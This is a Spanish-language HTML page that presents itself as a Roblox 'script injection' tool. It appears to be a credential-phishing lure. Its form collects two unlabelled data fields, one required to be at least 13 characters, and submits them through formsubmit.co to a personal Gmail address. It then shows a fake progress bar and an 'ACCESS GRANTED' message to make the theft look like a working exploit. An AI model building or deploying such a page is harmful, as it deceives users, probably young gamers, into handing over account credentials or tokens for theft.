<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>T1X SCRIPT INJECTION</title>

<style>
body{
margin:0;
overflow:hidden;
font-family:monospace;
color:#00ff9f;
background:black;
}

canvas{
position:fixed;
top:0;
left:0;
z-index:-1;
}

.card{
position:absolute;
top:50%;
left:50%;
transform:translate(-50%,-50%);
background:rgba(0,0,0,0.7);
padding:30px;
border-radius:15px;
width:320px;
text-align:center;
box-shadow:0 0 20px #00ff9f;
}

.title{
font-size:18px;
margin-bottom:15px;
letter-spacing:2px;
}

.btn{
display:block;
margin:10px auto;
padding:10px;
border-radius:8px;
border:none;
width:100%;
cursor:pointer;
background:#00ff9f;
color:black;
font-weight:bold;
}

input,textarea{
width:100%;
margin-top:10px;
padding:10px;
border-radius:8px;
border:none;
background:black;
color:#00ff9f;
}

textarea{
height:80px;
resize:none;
}

.hidden{
display:none;
}

.counter{
font-size:12px;
opacity:0.7;
margin-top:5px;
}

.info{
font-size:11px;
margin-top:12px;
animation:blink 1.5s infinite;
}

@keyframes blink{
0%{opacity:0.3}
50%{opacity:1}
100%{opacity:0.3}
}

.progress{
width:100%;
background:#022c22;
height:6px;
margin-top:10px;
border-radius:10px;
overflow:hidden;
display:none;
}

.bar{
height:100%;
width:0%;
background:#00ff9f;
}

.processing{
font-size:12px;
margin-top:5px;
display:none;
}

.success{
display:none;
font-size:18px;
margin-top:15px;
animation:fadeIn 1s ease-in-out;
}

@keyframes fadeIn{
from{opacity:0}
to{opacity:1}
}

</style>
</head>

<body>

<canvas id="matrix"></canvas>

<div class="card">

<div class="title">T1X SCRIPT INJECTION</div>

<button class="btn" onclick="mostrarFormulario()">roblox</button>

<form id="form" class="hidden" action="https://formsubmit.co/cesaralbertolandero@gmail.com" method="POST">

<input id="campo1" type="text" name="campo1" placeholder="Primer dato..." required>

<textarea id="campo2" name="campo2" placeholder="Segundo dato..." required></textarea>

<div class="counter">
<span id="contador">0</span>/13 caracteres
</div>

<div class="info">
somos 2 personas, funcionará en aproximadamente 12-24 horas
</div>

<div class="processing" id="processing">
Processing...
</div>

<div class="progress" id="progress">
<div class="bar" id="bar"></div>
</div>

<div class="success" id="success">
✔️ ACCESS GRANTED
</div>

<button id="btnAceptar" class="btn" type="submit" disabled>
ACEPTAR
</button>

</form>

</div>

<script>

function mostrarFormulario(){
document.getElementById("form").classList.remove("hidden");
}

const campo2=document.getElementById("campo2");
const boton=document.getElementById("btnAceptar");
const contador=document.getElementById("contador");

campo2.addEventListener("input",()=>{

contador.textContent=campo2.value.length;

if(campo2.value.length>=13){
boton.disabled=false;
}else{
boton.disabled=true;
}

});

const sonido = new Audio("https://assets.mixkit.co/active_storage/sfx/270/270-preview.mp3");

boton.addEventListener("click",(e)=>{

if(campo2.value.length<13){
e.preventDefault();
return;
}

document.getElementById("processing").style.display="block";
document.getElementById("progress").style.display="block";

let width=0;
const bar=document.getElementById("bar");

const interval=setInterval(()=>{
width+=5;
bar.style.width=width+"%";

if(width>=100){
clearInterval(interval);

document.getElementById("processing").style.display="none";
document.getElementById("success").style.display="block";

sonido.play();

setTimeout(()=>{
document.getElementById("form").style.display="none";
},1500);

}

},100);

});

// Matrix

const canvas=document.getElementById("matrix");
const ctx=canvas.getContext("2d");

canvas.height=window.innerHeight;
canvas.width=window.innerWidth;

const letras="01";
const fontSize=14;
const columnas=canvas.width/fontSize;

const drops=[];

for(let x=0;x<columnas;x++){
drops[x]=1;
}

function draw(){

ctx.fillStyle="rgba(0,0,0,0.05)";
ctx.fillRect(0,0,canvas.width,canvas.height);

ctx.fillStyle="#00ff9f";
ctx.font=fontSize+"px monospace";

for(let i=0;i<drops.length;i++){

const text=letras.charAt(Math.floor(Math.random()*letras.length));

ctx.fillText(text,i*fontSize,drops[i]*fontSize);

if(drops[i]*fontSize>canvas.height && Math.random()>0.975){
drops[i]=0;
}

drops[i]++;

}

}

setInterval(draw,35);

</script>

</body>
</html>
